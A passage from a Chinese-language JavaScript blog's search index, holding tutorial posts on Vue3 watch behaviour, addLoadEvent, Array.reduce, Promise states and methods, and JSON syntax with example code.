Vue3中的watch两个“坑”： watch监视的是reactive定义的响应式数据则无法正确获得oldValue，watch监视的是reactive定义的响应式数据则强制开启深度监视,只能获取newValue,无法获取oldValue 监视reactive定义的某个对象中的属性（也是对象）,deep有效,仍然无法获取oldValue 关于.value: 如果ref定义的是一个数字或者字符，比如ref(0)不能用.value 如果ref定义的是一个对象，则里面的属性本质上是由reactive定义，如果要监视里面的属性则得用.value，.value后由reactive定义，则自动开启深度监视，或者开启深度监视 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657 setup()&#123; let person=reactive(&#123; firstName:&quot;张&quot;, lastName:&quot;三&quot;, fullName:&#x27;&#x27;, job:&#123; one:&#x27;doctor&#x27;, tow:&#x27;teacher&#x27; &#125; &#125;) let sum=ref(0) let msg=ref(&quot;你好呀&quot;)//情况一：监视ref定义的响应式数据 watch(sum,(newValue,oldValue)=&gt;&#123; console.log(&quot;sum变化了&quot;,newValue,oldValue) &#125;) //情况二：监视多个ref定义的响应式数据 watch([sum,msg],(newValue,oldValue)=&gt;&#123; console.log(&quot;sum或msg变化了&quot;,newValue,oldValue) &#125;) //情况三：监视reactive定义的响应式数据：若watch监视的是reactive定义的响应式数据则无法正确获得oldValue，watch监视的是reactive定义的响应式数据则强制开启深度监视,只能获取newValue,无法获取oldValue watch(person,(newValue,oldValue)=&gt;&#123; console.log(&quot;person变化了&quot;,newValue,oldValue) &#125;,&#123;deep:false&#125;)//deep配置无效 //情况四:监视reactive定义的响应式数据中的某个属性 watch(()=&gt;person.firstName,(newValue,oldValue)=&gt;&#123; console.log(&quot;person的firstName变化了&quot;,newValue,oldValue) &#125;) //情况五：监视reactive定义的一个响应式数据中的某些属性 watch([()=&gt;person.firstName,()=&gt;person.lastName],(newValue,oldValue)=&gt;&#123; console.log(&quot;person的firstName/lastName变化了&quot;,newValue,oldValue) &#125;) //特殊情况监视reactive定义的某个对象中的属性（也是对象）,deep有效,仍然无法获取oldValue watch(()=&gt;person.job,(newValue,oldValue)=&gt;&#123; console.log(&quot;person的job变化了&quot;,newValue,oldValue) &#125;,&#123;deep:true&#125;) person.fullName=computed(&#123; get()&#123; return person.firstName+&#x27;-&#x27;+person.lastName &#125;, set(value)&#123; const nameArr=value.split(&#x27;-&#x27;) person.firstName=nameArr[0] person.lastName=nameArr[1] &#125; &#125;) watch() return &#123; person, sum, msg &#125; &#125;","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[{"name":"watch","slug":"watch","permalink":"https://coloey.github.io/tags/watch/"}]},{"title":"addLoadEvent","slug":"addLoadEvent","date":"2022-01-10T09:41:16.000Z","updated":"2022-01-10T09:47:57.127Z","comments":true,"path":"2022/01/10/addLoadEvent/","link":"","permalink":"https://coloey.github.io/2022/01/10/addLoadEvent/","excerpt":"","text":"1234567891011function addLoadEvent(func)&#123; var oldonload=window.onload; if(typeof oldonload!=&#x27;function&#x27;)&#123; window.onload=func;//如果处理函数还没有绑定任何函数，就添加新函数 &#125;else&#123; window.onload=function()&#123; oldonload(); func(); &#125; &#125; &#125;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"reduce","slug":"reduce","date":"2022-01-07T03:30:23.000Z","updated":"2022-01-07T13:25:55.147Z","comments":true,"path":"2022/01/07/reduce/","link":"","permalink":"https://coloey.github.io/2022/01/07/reduce/","excerpt":"","text":"arr.reduce(callback(accumulator,currentValue,index,array),InitValue) callback:执行数组中的每个值的函数，包括4个参数： accumulator currentValue 数组中正在处理的元素。 index 可选 数组中正在处理的当前元素的索引。 如果提供了initialValue，则起始索引号为0，否则从索引1起始。 array可选 调用reduce()的数组 initialValue可选 作为第一次调用 callback函数时的第一个参数的值。 如果没有提供初始值，则将使用数组中的第一个元素。 在没有初始值的空数组上调用 reduce 将报错。 返回累计处理后的结果 求数组中的所有值的和12345678910var sum=[0,1,2,3].reduce(function(accumulator,currentValue)&#123;return accumulator+currentValue;&#125;,0)//6//累加对象数组里的值var InitValue=0;var sum=[&#123;x:1&#125;,&#123;x:2&#125;,&#123;x:3&#125;].reduce(function(accumulator,currentValue)&#123; return accumulator+currentValue;&#125;,InitValue);console.log(sum);//6 将二维数组转为一维1var flattened=[[0,1],[2,3],[4,5],[6,7]].reduce(function(a,b)&#123;return a.concat(b);&#125;,[]) 计算数组中每个元素出现的个数1234567891011var names=[&#x27;Alice&#x27;,&#x27;Bob&#x27;,&#x27;Ann&#x27;,&#x27;Alice&#x27;,&#x27;Bob&#x27;]; var countNames=names.reduce((allNames,name)=&gt;&#123; if(name in allNames)&#123; allNames[name]++; &#125; else&#123; allNames[name]=1; &#125; return allNames; &#125;,&#123;&#125;); console.log(countNames); 按照属性对object分类123456789101112131415161718var people=[ &#123;name:&#x27;Alice&#x27;,age:20&#125;, &#123;name:&#x27;Max&#x27;,age:20&#125;, &#123;name:&#x27;Jane&#x27;,age:21&#125; ] function groupBy(objectArray,property)&#123; return objectArray.reduce(function(acc,obj)&#123; var key=obj[property]; if(!acc[key])&#123; acc[key]=[]; &#125; acc[key].push(obj); return acc; &#125;,&#123;&#125;); &#125; var groupedPeople=groupBy(people,&#x27;age&#x27;); console.log(groupedPeople); 使用扩展运算符绑定包含在对象数组中的数组123456789var friends=[&#123; name:&#x27;Anna&#x27;, books:[&#x27;Bible&#x27;,&#x27;Harry Potter&#x27;], age:21 &#125;, &#123;name:&#x27;Bob&#x27;,books:[&#x27;War and Peace&#x27;],age:16&#125;, &#123;name:&#x27;Mike&#x27;,books:[&#x27;The Shining&#x27;,&#x27;The Lord of the Rings&#x27;],age:18&#125;]; var allBooks=friends.reduce((prev,curr)=&gt;&#123;return [...prev,...curr.books]&#125;,[&#x27;Alphabet&#x27;]); console.log(allBooks); 数组去重123456789let myArray=[6,6,6,2,3,3,4,4,4,5]; let myOrderedArray=myArray.reduce((accumulator,currval)=&gt;&#123; if(accumulator.indexOf(currval)==-1)&#123; accumulator.push(currval); &#125; return accumulator; &#125;,[]) console.log(myOrderedArray);","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"Promise","slug":"Promise","date":"2022-01-06T12:59:19.000Z","updated":"2022-01-07T13:00:23.474Z","comments":true,"path":"2022/01/06/Promise/","link":"","permalink":"https://coloey.github.io/2022/01/06/Promise/","excerpt":"","text":"期约状态机Promise可以通过 new 操作符来实例化。创建新期约时需要传入执行器（executor）函数作为参数 123let p = new Promise(() =&gt; &#123;&#125;);setTimeout(console.log, 0, p); // Promise &lt;pending&gt; 在把一个期约实例传给 console.log()时，控制台输出（可能因浏览器不同而略有差异）表明该实例处于待定（pending）状态。如前所述，期约是一个有状态的对象，可能处于如下 3 种状态之一： 待定（pending）是期约的最初始状态。在待定状态下，期约可以落定（settled）为代表成功的兑现（fulfilled）状态，或者代表失败的拒绝（rejected）状态。无论落定为哪种状态都是不可逆的。只要从待定转换为兑现或拒绝，期约的状态就不再改变。而有时候也称为“解决”，resolved） 兑现（fulfilled)每个期约只要状态切换为兑现，就会有一个私有的内部值（value） 拒绝（rejected）如果期约被拒绝，程序就会期待期约状态改变时可以拿到拒绝的理由 期约用途期约主要有两大用途。首先是抽象地表示一个异步操作。期约的状态代表期约是否完成。某些情况下，这个状态机就是期约可以提供的最有用的信息。 通过执行函数控制期约状态期约的状态是私有的，所以只能在内部进行操作。内部操作在期约的执行器函数中完成。执行器函数主要有两项职责：初始化期约的异步行为和控制状态的最终转换。其中，控制期约状态的转换是通过调用它的两个函数参数实现的。这两个函数参数通常都命名为 resolve()和 reject()。调用resolve()会把状态切换为兑现，调用 reject()会把状态切换为拒绝。另外，调用 reject()也会抛出错误 123456let p1=new Promise((resolve,reject)=&gt;resolve());setTimeout(console.log,0,p1);//Promise &lt;resolved&gt;let p2 = new Promise((resolve, reject) =&gt; reject());setTimeout(console.log, 0, p2); // Promise &lt;rejected&gt;// Uncaught error (in promise) 在前面的例子中，并没有什么异步操作，因为在初始化期约时，执行器函数已经改变了每个期约的状态，执行器函数是同步执行的。这是因为执行器函数是期约的初始化程序。 添加 setTimeout 可以推迟切换状态： 1234let p = new Promise((resolve, reject) =&gt; setTimeout(resolve, 1000));// 在 console.log 打印期约实例的时候，还不会执行超时回调（即 resolve()）setTimeout(console.log, 0, p); // Promise &lt;pending&gt; 无论 resolve()和 reject()中的哪个被调用，状态转换都不可撤销了。于是继续修改状态会静默失败，如下所示： 123456let p = new Promise((resolve, reject) =&gt; &#123;resolve();reject(); // 没有效果&#125;);setTimeout(console.log, 0, p); // Promise &lt;resolved&gt; Promise.resolve()下面两个期约实例实际上是一样的： let p1 = new Promise((resolve, reject) =&gt; resolve());let p2 = Promise.resolve(); 这个解决的期约的值对应着传给 Promise.resolve()的第一个参数。使用这个静态方法，实际上可以把任何值都转换为一个期约 12345678setTimeout(console.log,0,Promise.resolve());// Promise &lt;resolved&gt;: undefinedsetTimeout(console.log, 0, Promise.resolve(3));// Promise &lt;resolved&gt;: 3// 多余的参数会忽略setTimeout(console.log, 0, Promise.resolve(4, 5, 6));// Promise &lt;resolved&gt;: 4 对这个静态方法而言，如果传入的参数本身是一个期约，那它的行为就类似于一个空包装。因此，Promise.resolve()可以说是一个幂等方法 1234567891011let p = Promise.resolve(7);setTimeout(console.log, 0, p === Promise.resolve(p));// truesetTimeout(console.log, 0, p === Promise.resolve(Promise.resolve(p)));// true//这个幂等性会保留传入期约的状态：let p = new Promise(() =&gt; &#123;&#125;);setTimeout(console.log, 0, p); // Promise &lt;pending&gt;setTimeout(console.log, 0, Promise.resolve(p)); // Promise &lt;pending&gt;setTimeout(console.log, 0, p === Promise.resolve(p)); // true 注意，这个静态方法能够包装任何非期约值，包括错误对象，并将其转换为解决的期约。因此，也可能导致不符合预期的行为： 1234let p = Promise.resolve(new Error(&#x27;foo&#x27;));setTimeout(console.log, 0, p);// Promise &lt;resolved&gt;: Error: foo Promise.reject()与 Promise.resolve()类似，Promise.reject()会实例化一个拒绝的期约并抛出一个异步错误（这个错误不能通过 try/catch 捕获，而只能通过拒绝处理程序捕获）。下面的两个期约实例实际上是一样的： let p1 = new Promise((resolve, reject) =&gt; reject());let p2 = Promise.reject(); 这个拒绝的期约的理由就是传给 Promise.reject()的第一个参数。这个参数也会传给后续的拒绝处理程序： 1234let p = Promise.reject(3);setTimeout(console.log, 0, p); // Promise &lt;rejected&gt;: 3p.then(null, (e) =&gt; setTimeout(console.log, 0, e)); // 3 关键在于，Promise.reject()并没有照搬 Promise.resolve()的幂等逻辑。如果给它传一个期约对象，则这个期约会成为它返回的拒绝期约的理由： 123setTimeout(console.log, 0, Promise.reject(Promise.resolve()));// Promise &lt;rejected&gt;: Promise &lt;resolved&gt; 同步/异步执行的二元性123456789101112try &#123;throw new Error(&#x27;foo&#x27;);&#125; catch(e) &#123;console.log(e); // Error: foo&#125;try &#123;Promise.reject(new Error(&#x27;bar&#x27;));&#125; catch(e) &#123;console.log(e);&#125;// Uncaught (in promise) Error: bar 第一个 try/catch 抛出并捕获了错误，第二个 try/catch 抛出错误却没有捕获到,这里的同步代码之所以没有捕获期约抛出的错误，是因为它没有通过异步模式捕获错误。从这里就可以看出期约真正的异步特性：它们是同步对象（在同步执行模式中使用），但也是异步执行模式的媒介。在前面的例子中，拒绝期约的错误并没有抛到执行同步代码的线程里，而是通过浏览器异步消息队列来处理的。因此，try/catch 块并不能捕获该错误。代码一旦开始以异步模式执行，则唯一与之交互的方式就是使用异步结构——更具体地说，就是期约的方法。 Promise.prototype.then()Promise.prototype.then()是为期约实例添加处理程序的主要方法。这个 then()方法接收最多 两个参数：onResolved 处理程序和 onRejected 处理程序。这两个参数都是可选的，如果提供的话，则会在期约分别进入“兑现”和“拒绝”状态时执行。传给 then()的任何非函数类型的参数都会被静 默忽略。如果想只提供 onRejected 参数，那就要在 onResolved 参数的位置上传入 undefined。这 样有助于避免在内存中创建多余的对象 123456789101112131415function onResolved(id) &#123; setTimeout(console.log, 0, id, &#x27;resolved&#x27;); &#125; function onRejected(id) &#123; setTimeout(console.log, 0, id, &#x27;rejected&#x27;); &#125; let p1 = new Promise((resolve, reject) =&gt; setTimeout(resolve, 3000)); let p2 = new Promise((resolve, reject) =&gt; setTimeout(reject, 3000)); p1.then(() =&gt; onResolved(&#x27;p1&#x27;), () =&gt; onRejected(&#x27;p1&#x27;)); p2.then(() =&gt; onResolved(&#x27;p2&#x27;), () =&gt; onRejected(&#x27;p2&#x27;)); //（3 秒后）// p1 resolved // p2 rejected 1234567891011121314function onResolved(id) &#123; setTimeout(console.log, 0, id, &#x27;resolved&#x27;); &#125; function onRejected(id) &#123; setTimeout(console.log, 0, id, &#x27;rejected&#x27;); &#125; let p1 = new Promise((resolve, reject) =&gt; setTimeout(resolve, 3000)); let p2 = new Promise((resolve, reject) =&gt; setTimeout(reject, 3000)); // 非函数处理程序会被静默忽略，不推荐p1.then(&#x27;gobbeltygook&#x27;); // 不传 onResolved 处理程序的规范写法p2.then(null, () =&gt; onRejected(&#x27;p2&#x27;)); // p2 rejected（3 秒后 Promise.prototype.then()方法返回一个新的期约实例： 12345let p1 = new Promise(() =&gt; &#123;&#125;); let p2 = p1.then(); setTimeout(console.log, 0, p1); // Promise &lt;pending&gt; setTimeout(console.log, 0, p2); // Promise &lt;pending&gt; setTimeout(console.log, 0, p1 === p2); // false 这个新期约实例基于 onResovled 处理程序的返回值构建。换句话说，该处理程序的返回值会通过 Promise.resolve()包装来生成新期约。如果没有提供这个处理程序，则 Promise.resolve()就会 包装上一个期约解决之后的值。如果没有显式的返回语句，则 Promise.resolve()会包装默认的返回 值 undefined。 123456789101112131415161718192021222324252627282930313233let p1 = Promise.resolve(&#x27;foo&#x27;); // 若调用 then()时不传处理程序，则原样向后传let p2 = p1.then();setTimeout(console.log, 0, p2); // Promise &lt;resolved&gt;: foo // 这些都一样let p3 = p1.then(() =&gt; undefined); let p4 = p1.then(() =&gt; &#123;&#125;); let p5 = p1.then(() =&gt; Promise.resolve()); setTimeout(console.log, 0, p3); // Promise &lt;resolved&gt;: undefined setTimeout(console.log, 0, p4); // Promise &lt;resolved&gt;: undefined setTimeout(console.log, 0, p5); // Promise &lt;resolved&gt;: undefined //如果有显式的返回值，则 Promise.resolve()会包装这个值：// 这些都一样let p6 = p1.then(() =&gt; &#x27;bar&#x27;); let p7 = p1.then(() =&gt; Promise.resolve(&#x27;bar&#x27;)); setTimeout(console.log, 0, p6); // Promise &lt;resolved&gt;: bar setTimeout(console.log, 0, p7); // Promise &lt;resolved&gt;: bar // Promise.resolve()保留返回的期约let p8 = p1.then(() =&gt; new Promise(() =&gt; &#123;&#125;)); let p9 = p1.then(() =&gt; Promise.reject()); // Uncaught (in promise): undefined setTimeout(console.log, 0, p8); // Promise &lt;pending&gt; setTimeout(console.log, 0, p9); // Promise &lt;rejected&gt;: undefined//抛出异常会返回拒绝的期约： let p10 = p1.then(() =&gt; &#123; throw &#x27;baz&#x27;; &#125;); // Uncaught (in promise) baz setTimeout(console.log, 0, p10); // Promise &lt;rejected&gt; baz //注意，返回错误值不会触发上面的拒绝行为，而会把错误对象包装在一个解决的期约中：... let p11 = p1.then(() =&gt; Error(&#x27;qux&#x27;)); setTimeout(console.log, 0, p11); // Promise &lt;resolved&gt;: Error: qux onRejected 处理程序也与之类似：onRejected 处理程序返回的值也会被 Promise.resolve() 包装。乍一看这可能有点违反直觉，但是想一想，onRejected 处理程序的任务不就是捕获异步错误吗？ 因此，拒绝处理程序在捕获错误后不抛出异常是符合期约的行为，应该返回一个解决期约 12345678910111213141516171819202122232425262728let p1 = Promise.reject(&#x27;foo&#x27;); // 调用 then()时不传处理程序则原样向后传let p2 = p1.then(); // Uncaught (in promise) foosetTimeout(console.log, 0, p2); // Promise &lt;rejected&gt;: foo // 这些都一样let p3 = p1.then(null, () =&gt; undefined); let p4 = p1.then(null, () =&gt; &#123;&#125;); let p5 = p1.then(null, () =&gt; Promise.resolve()); setTimeout(console.log, 0, p3); // Promise &lt;resolved&gt;: undefined setTimeout(console.log, 0, p4); // Promise &lt;resolved&gt;: undefined setTimeout(console.log, 0, p5); // Promise &lt;resolved&gt;: undefined // 这些都一样let p6 = p1.then(null, () =&gt; &#x27;bar&#x27;); let p7 = p1.then(null, () =&gt; Promise.resolve(&#x27;bar&#x27;)); setTimeout(console.log, 0, p6); // Promise &lt;resolved&gt;: bar setTimeout(console.log, 0, p7); // Promise &lt;resolved&gt;: bar // Promise.resolve()保留返回的期约let p8 = p1.then(null, () =&gt; new Promise(() =&gt; &#123;&#125;)); let p9 = p1.then(null, () =&gt; Promise.reject()); // Uncaught (in promise): undefined setTimeout(console.log, 0, p8); // Promise &lt;pending&gt; setTimeout(console.log, 0, p9); // Promise &lt;rejected&gt;: undefined let p10 = p1.then(null, () =&gt; &#123; throw &#x27;baz&#x27;; &#125;); // Uncaught (in promise) baz setTimeout(console.log, 0, p10); // Promise &lt;rejected&gt;: baz let p11 = p1.then(null, () =&gt; Error(&#x27;qux&#x27;)); setTimeout(console.log, 0, p11); // Promise &lt;resolved&gt;: Error: qux Promise.prototype.catch()Promise.prototype.catch()方法用于给期约添加拒绝处理程序。这个方法只接收一个参数： onRejected 处理程序。事实上，这个方法就是一个语法糖，调用它就相当于调用 Promise.prototype. then(null, onRejected) 1234567let p = Promise.reject(); let onRejected = function(e) &#123; setTimeout(console.log, 0, &#x27;rejected&#x27;); &#125;; // 这两种添加拒绝处理程序的方式是一样的：p.then(null, onRejected); // rejected p.catch(onRejected); // rejected Promise.prototype.catch()返回一个新的期约实例： 12345let p1 = new Promise(() =&gt; &#123;&#125;); let p2 = p1.catch(); setTimeout(console.log, 0, p1); // Promise &lt;pending&gt; setTimeout(console.log, 0, p2); // Promise &lt;pending&gt; setTimeout(console.log, 0, p1 === p2); // false Promise.prototype.finally()Promise.prototype.finally()方法用于给期约添加 onFinally 处理程序，这个处理程序在期 约转换为解决或拒绝状态时都会执行。这个方法可以避免 onResolved 和 onRejected 处理程序中出 现冗余代码。但 onFinally 处理程序没有办法知道期约的状态是解决还是拒绝，所以这个方法主要用清理代码 1234567let p1 = Promise.resolve(); let p2 = Promise.reject(); let onFinally = function() &#123; setTimeout(console.log, 0, &#x27;Finally!&#x27;) &#125; p1.finally(onFinally); // Finally p2.finally(onFinally); // Finally Promise.prototype.finally()方法返回一个新的期约实例： 12345let p1 = new Promise(() =&gt; &#123;&#125;); let p2 = p1.finally();setTimeout(console.log, 0, p1); // Promise &lt;pending&gt; setTimeout(console.log, 0, p2); // Promise &lt;pending&gt; setTimeout(console.log, 0, p1 === p2); // false 这个新期约实例不同于 then()或 catch()方式返回的实例。因为 onFinally 被设计为一个状态 无关的方法，所以在大多数情况下它将表现为父期约的传递 1234567891011121314151617181920212223242526let p1 = Promise.resolve(&#x27;foo&#x27;); // 这里都会原样后传let p2 = p1.finally(); let p3 = p1.finally(() =&gt; undefined); let p4 = p1.finally(() =&gt; &#123;&#125;); let p5 = p1.finally(() =&gt; Promise.resolve()); let p6 = p1.finally(() =&gt; &#x27;bar&#x27;); let p7 = p1.finally(() =&gt; Promise.resolve(&#x27;bar&#x27;)); let p8 = p1.finally(() =&gt; Error(&#x27;qux&#x27;)); setTimeout(console.log, 0, p2); // Promise &lt;resolved&gt;: foo setTimeout(console.log, 0, p3); // Promise &lt;resolved&gt;: foo setTimeout(console.log, 0, p4); // Promise &lt;resolved&gt;: foo setTimeout(console.log, 0, p5); // Promise &lt;resolved&gt;: foo setTimeout(console.log, 0, p6); // Promise &lt;resolved&gt;: foo setTimeout(console.log, 0, p7); // Promise &lt;resolved&gt;: foo setTimeout(console.log, 0, p8); // Promise &lt;resolved&gt;: foo //如果返回的是一个待定的期约，或者 onFinally 处理程序抛出了错误（显式抛出或返回了一个拒绝期约），则会返回相应的期约（待定或拒绝）// Promise.resolve()保留返回的期约let p9 = p1.finally(() =&gt; new Promise(() =&gt; &#123;&#125;)); let p10 = p1.finally(() =&gt; Promise.reject()); // Uncaught (in promise): undefined setTimeout(console.log, 0, p9); // Promise &lt;pending&gt; setTimeout(console.log, 0, p10); // Promise &lt;rejected&gt;: undefined let p11 = p1.finally(() =&gt; &#123; throw &#x27;baz&#x27;; &#125;); // Uncaught (in promise) baz setTimeout(console.log, 0, p11); // Promise &lt;rejected&gt;: baz 非重入期约方法当期约进入落定状态时，与该状态相关的处理程序仅仅会被排期，而非立即执行。跟在添加这个处 理程序的代码之后的同步代码一定会在处理程序之前先执行。即使期约一开始就是与附加处理程序关联 的状态，执行顺序也是这样的。这个特性由 JavaScript 运行时保证，被称为“非重入”（non-reentrancy） 特性。 1234567891011121314151617let synchronousResolve; // 创建一个期约并将解决函数保存在一个局部变量中let p = new Promise((resolve) =&gt; &#123; synchronousResolve = function() &#123; console.log(&#x27;1: invoking resolve()&#x27;); resolve(); console.log(&#x27;2: resolve() returns&#x27;); &#125;; &#125;); p.then(() =&gt; console.log(&#x27;4: then() handler executes&#x27;)); synchronousResolve(); console.log(&#x27;3: synchronousResolve() returns&#x27;); // 实际的输出：// 1: invoking resolve() // 2: resolve() returns // 3: synchronousResolve() returns // 4: then() handler executes 在这个例子中，即使期约状态变化发生在添加处理程序之后，处理程序也会等到运行的消息队列让 它出列时才会执行。 传递解决值和拒绝理由到了落定状态后，期约会提供其解决值（如果兑现）或其拒绝理由（如果拒绝）给相关状态的处理 程序。拿到返回值后，就可以进一步对这个值进行操作。比如，第一次网络请求返回的 JSON 是发送第 二次请求必需的数据，那么第一次请求返回的值就应该传给 onResolved 处理程序继续处理。当然，失 败的网络请求也应该把 HTTP 状态码传给 onRejected 处理程序。 在执行函数中，解决的值和拒绝的理由是分别作为 resolve()和 reject()的第一个参数往后传 的。然后，这些值又会传给它们各自的处理程序，作为 onResolved 或 onRejected 处理程序的唯一 参数。 1234let p1 = new Promise((resolve, reject) =&gt; resolve(&#x27;foo&#x27;)); p1.then((value) =&gt; console.log(value)); // foo let p2 = new Promise((resolve, reject) =&gt; reject(&#x27;bar&#x27;)); p2.catch((reason) =&gt; console.log(reason)); // bar then()和 catch()的 onRejected 处理程序在语义上相当于 try/catch。出发点都是捕获错误之 后将其隔离，同时不影响正常逻辑执行。为此，onRejected 处理程序的任务应该是在捕获异步错误之 后返回一个解决的期约。下面的例子中对比了同步错误处理与异步错误处理： 123456789101112131415161718192021console.log(&#x27;begin synchronous execution&#x27;); try &#123; throw Error(&#x27;foo&#x27;); &#125; catch(e) &#123; console.log(&#x27;caught error&#x27;, e); &#125; console.log(&#x27;continue synchronous execution&#x27;); // begin synchronous execution // caught error Error: foo // continue synchronous execution new Promise((resolve, reject) =&gt; &#123; console.log(&#x27;begin asynchronous execution&#x27;); reject(Error(&#x27;bar&#x27;)); &#125;).catch((e) =&gt; &#123; console.log(&#x27;caught error&#x27;, e); &#125;).then(() =&gt; &#123; console.log(&#x27;continue asynchronous execution&#x27;); &#125;); // begin asynchronous execution // caught error Error: bar // continue asynchronous execution 期约连锁每个后续的处理程序都会等待前一个期约解决，然后实例化一个新期约并返回它。这种结构可以简 洁地将异步任务串行化，解决之前依赖回调的难题 1234567891011121314function delayedResolve(str) &#123; return new Promise((resolve, reject) =&gt; &#123; console.log(str); setTimeout(resolve, 1000); &#125;); &#125;delayedResolve(&#x27;p1 executor&#x27;) .then(() =&gt; delayedResolve(&#x27;p2 executor&#x27;)) .then(() =&gt; delayedResolve(&#x27;p3 executor&#x27;)) .then(() =&gt; delayedResolve(&#x27;p4 executor&#x27;)) // p1 executor（1 秒后）// p2 executor（2 秒后）// p3 executor（3 秒后）// p4 executor（4 秒后） Promise.all()Promise.all方法用于将多个 Promise 实例，这个静态方法接收一个可迭代对象，将参数转为 Promise 实例，再包装成一个新的 Promise 实例。 合成的期约只会在每个包含的期约都解决之后才解决 如果至少有一个包含的期约待定，则合成的期约也会待定。如果有一个包含的期约拒绝，则合成的 期约也会拒绝 1234567//永远待定let p1=Promise.all([new Promise(()=&gt;&#123;&#125;)]);setTimeout(console.log,0,p1);//Promise &lt;pending&gt;//一次拒绝会导致最终期约拒绝let p2=Promise.all([Promise.resolve(),Promise.reject(),Promise.resolve()]);setTimeout(console.log,0,p2);//Promise &lt;rejected&gt;//Uncaught (in promise) undefined 如果所有期约都成功解决，则合成期约的解决值就是所有包含期约解决值的数组，按照迭代器顺序: 1234567891011121314let p = Promise.all([ Promise.resolve(3), Promise.resolve(), Promise.resolve(4) ]); p.then((values) =&gt; setTimeout(console.log, 0, values)); // [3, undefined, 4] // 虽然只有第一个期约的拒绝理由会进入 // 拒绝处理程序，第二个期约的拒绝也// 会被静默处理，不会有错误跑掉let p = Promise.all([ Promise.reject(3), new Promise((resolve, reject) =&gt; setTimeout(reject, 1000)) ]); p.catch((reason) =&gt; setTimeout(console.log, 0, reason)); // 3 Promise.race()Promise.race()静态方法返回一个包装期约，是一组集合中最先解决或拒绝的期约的镜像。这个 方法接收一个可迭代对象，返回一个新期约 12345678910111213141516171819// 解决先发生，超时后的拒绝被忽略let p1 = Promise.race([ Promise.resolve(3), new Promise((resolve, reject) =&gt; setTimeout(reject, 1000)) ]); setTimeout(console.log, 0, p1); // Promise &lt;resolved&gt;: 3 // 拒绝先发生，超时后的解决被忽略let p2 = Promise.race([ Promise.reject(4), new Promise((resolve, reject) =&gt; setTimeout(resolve, 1000)) ]); setTimeout(console.log, 0, p2); // Promise &lt;rejected&gt;: 4 // 迭代顺序决定了落定顺序let p3 = Promise.race([ Promise.resolve(5), Promise.resolve(6), Promise.resolve(7) ]); setTimeout(console.log, 0, p3); // Promise &lt;resolved&gt;: 5 串行期约合成1234567function addTwo(x)&#123;return x+1;&#125;function addThree(x)&#123;return x+3;&#125;function addFive(x)&#123;return x+5;&#125;function addTen(x)&#123; return [addTwo,addThree,addFive].reduce((promise,fn)=&gt;promise.then(fn),Promise.resolve(x));&#125;addTen(8).then(console.log); donePromise 对象的回调链，不管以then方法或catch方法结尾，要是最后一个方法抛出错误，都有可能无法捕捉到（因为 Promise 内部的错误不会冒泡到全局）。因此，我们可以提供一个done方法，总是处于回调链的尾端，保证抛出任何可能出现的错误。 12345678910111213asyncFunc() .then(f1) .catch(r1) .then(f2) .done();Promise.prototype.done=function(onResolved,onRejected)&#123; this.then(onResolved,onRejected) .catch(function(reason)&#123; //抛出一个全局错误 setTimeout(()=&gt;&#123;throw reason&#125;,0); &#125;); &#125; finallyfinally()f方法用于指定不管Promise对象最后状态如何，都会执行的操作，它接受一个普通的回调函数作为参数，该函数不管怎样都必须执行。 123456789101112server.listen(0) .then(function () &#123; // run test &#125;) .finally(server.stop);Promise.prototype.finally=function(callback)&#123; let P=this.constructor; return this.then( value=&gt;P.resolve(callback()).then(()=&gt;value), reason=&gt;P.resolve(callback()).then(()=&gt;&#123;throw reason&#125;) ); &#125; 用途将图片的加载写成一个Promise，一旦加载完成，Promise的状态发生变化 123456789//加载图片 const preloadImage=function(path)&#123; return new Promise(function(resolve,reject)&#123; const image=new Image(); image.onload=resolve; image.onerror=reject; image.src=path; &#125;) &#125;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"json","slug":"json","date":"2022-01-04T08:03:00.000Z","updated":"2022-01-04T09:00:12.474Z","comments":true,"path":"2022/01/04/json/","link":"","permalink":"https://coloey.github.io/2022/01/04/json/","excerpt":"","text":"把它当成一种数据格式，而不是编程语言。JSON 不属于 JavaScript，它们只是拥有相同的语法而已。JSON 也不是只能在 JavaScript 中使用，它是一种通用数据格式。很多语言都有解析和序列化 JSON 的内置能力。 语法 简单值：字符串、数值、布尔值和 null 可以在 JSON 中出现，就像在 JavaScript 中一样。特殊值 undefined 不可以。 对象：第一种复杂数据类型，对象表示有序键/值对。每个值可以是简单值，也可以是复杂类型。 数组：第二种复杂数据类型，数组表示可以通过数值索引访问的值的有序列表。数组的值可以是任意类型，包括简单值、对象，甚至其他数组。 简单值JavaScript 字符串与 JSON 字符串的主要区别是，JSON 字符串必须使用双引号（单引号会导致语法错误）。布尔值和 null 本身也是有效的 JSON 值 对象与 JavaScript 对象字面量相比，JSON 主要有两处不同。首先，没有变量声明（JSON 中没有变量）。其次，最后没有分号（不需要，因为不是 JavaScript 语句）。同样，用引号将属性名包围起来才是有效的JSON。属性的值可以是简单值或复杂数据类型值，后者可以在对象中再嵌入对象. 123456789&#123;&quot;name&quot;: &quot;Nicholas&quot;,&quot;age&quot;: 29,&quot;school&quot;: &#123;&quot;name&quot;: &quot;Merrimack College&quot;,&quot;location&quot;: &quot;North Andover, MA&quot;&#125;&#125; 数组数组在 JSON 中使用 JavaScript 的数组字面量形式表示. JavaScript 12let values = [25, &quot;hi&quot;, true]; Json 1[25,&quot;hi&quot;,true] JavaScript序列化为Jsonstringfy()：在序列化 JavaScript 对象时，所有函数和原型成员都会有意地在结果中省略。此外，值为 undefined的任何属性也会被跳过。最终得到的就是所有实例属性均为有效 JSON 数据类型的表 1234567891011let book = &#123;title: &quot;Professional JavaScript&quot;,authors: [&quot;Nicholas C. Zakas&quot;,&quot;Matt Frisbie&quot;],edition: 4,year: 2017&#125;;let jsonText = JSON.stringify(book); 结果： {“title”:”Professional JavaScript”,”authors”:[“Nicholas C. Zakas”,”Matt Frisbie”],“edition”:4,”year”:2017} 还可以接收两个参数。这两个参数可以用于指定其他序列化 JavaScript 对象的方式。第一个参数是过滤器，可以是数组或函数；第二个参数是用于缩进结果 JSON 字符串的选项。 1234567891011let book = &#123;title: &quot;Professional JavaScript&quot;,authors: [&quot;Nicholas C. Zakas&quot;,&quot;Matt Frisbie&quot;],edition: 4,year: 2017&#125;;let jsonText = JSON.stringify(book, 